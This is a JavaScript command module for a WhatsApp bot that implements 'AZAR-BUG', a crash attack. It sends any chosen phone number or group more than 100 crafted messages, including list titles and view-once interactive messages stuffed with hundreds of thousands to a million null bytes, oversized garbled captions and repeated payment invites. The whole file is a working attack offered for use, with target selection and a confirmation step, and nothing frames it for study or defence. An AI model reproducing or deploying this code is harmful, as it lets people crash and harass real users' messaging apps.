// commands/azarbug.js
// ==============================================
// ⚠️ AZAR-BUG Command – Xeon Bot Injection
// Uses the same exploit functions as the Xeon bot.
// ==============================================

const settings = require("../settings");
const { proto } = require("@whiskeysockets/baileys");

// ---------- Helper: Generate WAMessage content (as in Xeon bot) ----------
function generateWAMessageFromContent(jid, obj, options = {}) {
  return proto.WebMessageInfo.fromObject({
    key: {
      remoteJid: jid,
      fromMe: true,
      id: "bug_" + Date.now() + Math.random().toString(36).substring(2, 10)
    },
    message: obj,
    messageTimestamp: Math.floor(Date.now() / 1000),
    ...options
  });
}

// ---------- 1. Various heavy messages (list + live location + system crash) ----------
async function sendVariousMessages(sock, jid, count) {
  for (let i = 0; i < count; i++) {
    // List message with huge title
    const listMsg = {
      listMessage: {
        title: "S̷Y̷S̷T̷E̷M̷ U̷I̷ C̷R̷A̷S̷H̷" + "\0".repeat(920000),
        footerText: "Bug",
        description: "Crash",
        buttonText: null,
        listType: 2,
        productListInfo: { productSections: [] }
      }
    };
    await sock.relayMessage(jid, listMsg, {});

    // Live location message with huge caption
    const liveLoc = {
      liveLocationMessage: {
        degreesLatitude: "p",
        degreesLongitude: "p",
        caption: "Ø‚Ù†ØƒØ„Ù½".repeat(50000),
        sequenceNumber: "0",
        jpegThumbnail: ""
      }
    };
    await sock.relayMessage(jid, liveLoc, {});

    // System crash message with huge null bytes
    const crashMsg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { title: "", subtitle: " " },
            body: { text: "S̷Y̷S̷T̷E̷M̷ U̷I̷ C̷R̷A̷S̷H̷" },
            footer: { text: "xp" },
            nativeFlowMessage: {
              buttons: [{
                name: "cta_url",
                buttonParamsJson: "{ display_text : 'CRASH', url : '', merchant_url : '' }"
              }],
              messageParamsJson: "\0".repeat(1000000)
            }
          }
        }
      }
    };
    await sock.relayMessage(jid, crashMsg, {});
    await new Promise(r => setTimeout(r, 500));
  }
}

// ---------- 2. Payment invites + extended text ----------
async function sendMultiplePaymentInvites(sock, jid, count) {
  for (let i = 0; i < count; i++) {
    const paymentMsg = {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 86400000
      }
    };
    await sock.relayMessage(jid, paymentMsg, {});
    const extText = {
      extendedTextMessage: {
        text: ".",
        contextInfo: {
          stanzaId: jid,
          participant: jid,
          quotedMessage: {
            conversation: "Ø‚Ù†ØƒØ„Ù½".repeat(50000)
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          }
        },
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };
    await sock.relayMessage(jid, extText, { participant: { jid: jid } });
    await new Promise(r => setTimeout(r, 500));
  }
}

// ---------- 3. Repeated system crash messages ----------
async function sendRepeatedCrash(sock, jid, count) {
  for (let i = 0; i < count; i++) {
    const crashMsg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { title: "", subtitle: " " },
            body: { text: "S̷Y̷S̷T̷E̷M̷ U̷I̷ C̷R̷A̷S̷H̷" },
            footer: { text: "xp" },
            nativeFlowMessage: {
              buttons: [{
                name: "cta_url",
                buttonParamsJson: "{ display_text : 'CRASH', url : '', merchant_url : '' }"
              }],
              messageParamsJson: "\0".repeat(1000000)
            }
          }
        }
      }
    };
    await sock.relayMessage(jid, crashMsg, {});
    await new Promise(r => setTimeout(r, 500));
  }
}

// ---------- 4. Mixed messages (live location + list) ----------
async function sendMixedMessages(sock, jid, count) {
  for (let i = 0; i < count; i++) {
    const liveLoc = {
      liveLocationMessage: {
        degreesLatitude: "p",
        degreesLongitude: "p",
        caption: "Ø‚Ù†ØƒØ„Ù½".repeat(50000),
        sequenceNumber: "0",
        jpegThumbnail: ""
      }
    };
    await sock.relayMessage(jid, liveLoc, {});
    const listMsg = {
      listMessage: {
        title: "S̷Y̷S̷T̷E̷M̷ U̷I̷ C̷R̷A̷S̷H̷" + "\0".repeat(920000),
        footerText: "Bug",
        description: "Crash",
        buttonText: null,
        listType: 2,
        productListInfo: { productSections: [] }
      }
    };
    await sock.relayMessage(jid, listMsg, {});
    await new Promise(r => setTimeout(r, 500));
  }
}

// ---------- 5. View‑once messages with huge null bytes ----------
async function sendViewOnceMessages(sock, jid, count) {
  for (let i = 0; i < count; i++) {
    const viewOnceMsg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: {
            body: { text: "" },
            footer: { text: "" },
            header: { title: "", subtitle: "", hasMediaAttachment: false },
            nativeFlowMessage: {
              buttons: [{
                name: "cta_url",
                buttonParamsJson: "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              messageParamsJson: "\0".repeat(100000)
            }
          }
        }
      }
    };
    await sock.relayMessage(jid, viewOnceMsg, {});
    await new Promise(r => setTimeout(r, 500));
  }
}

// ---------- Main command ----------
const pendingConfirmations = new Map();

module.exports = async (sock, msg, from, text, args, store) => {
  try {
    // --- Owner verification (same as your mode command) ---
    const sender = msg.key.participant || msg.key.remoteJid || "unknown";
    const ownerNumber = (settings.ownerNumber || "").replace(/\D/g, "");
    const isOwner = msg.key.fromMe || sender.includes(ownerNumber);
    if (!isOwner) {
      return sock.sendMessage(from, { text: "🚨 Owner only." }, { quoted: msg });
    }

    // --- Target selection ---
    let target, type = "";
    if (!args[0] || args[0] === "group") {
      if (!from.endsWith("@g.us")) return sock.sendMessage(from, { text: "❌ Use in a group or give a number/link." }, { quoted: msg });
      target = from;
      type = "this group";
    } else if (args[0].includes("chat.whatsapp.com")) {
      const code = args[0].split("/").pop();
      const info = await sock.groupGetInviteInfo(code);
      if (!info?.id) throw new Error();
      target = info.id;
      await sock.groupMetadata(target);
      type = "group (via link)";
    } else if (args[0].includes("@g.us")) {
      target = args[0];
      await sock.groupMetadata(target);
      type = "specified group";
    } else {
      const num = args[0].replace(/\D/g, "");
      if (num.length < 9) return sock.sendMessage(from, { text: "❌ Invalid number." }, { quoted: msg });
      target = `${num}@s.whatsapp.net`;
      type = "private chat";
    }

    const key = `${from}-${target}`;
    if (pendingConfirmations.has(key)) {
      pendingConfirmations.delete(key);

      await sock.sendMessage(from, { text: `💣 Starting full bug injection to ${type}...` }, { quoted: msg });

      // --- Run all exploit functions (20 cycles each) ---
      try {
        await sendVariousMessages(sock, target, 20);
        await sendMultiplePaymentInvites(sock, target, 20);
        await sendRepeatedCrash(sock, target, 20);
        await sendMixedMessages(sock, target, 20);
        await sendViewOnceMessages(sock, target, 20);

        await sock.sendMessage(from, { text: `✅ Bug injection complete: 100+ crafted messages sent to ${type}.` }, { quoted: msg });
      } catch (err) {
        console.error("Bug injection error:", err);
        await sock.sendMessage(from, { text: `❌ Injection failed: ${err.message}` }, { quoted: msg });
      }
    } else {
      pendingConfirmations.set(key, Date.now());
      setTimeout(() => pendingConfirmations.delete(key), 5 * 60 * 1000);
      await sock.sendMessage(from, {
        text: `⚠️ *CONFIRM AZAR-BUG (XEON INJECT)*\n\nTarget: ${type}\nPayload: 100+ crafted messages (list, live location, system crash, payment invites, view‑once)\nSend the SAME command again within 5 minutes to start.`
      }, { quoted: msg });
    }
  } catch (err) {
    console.error(err);
    sock.sendMessage(from, { text: `❌ Error: ${err.message}` }, { quoted: msg });
  }
};
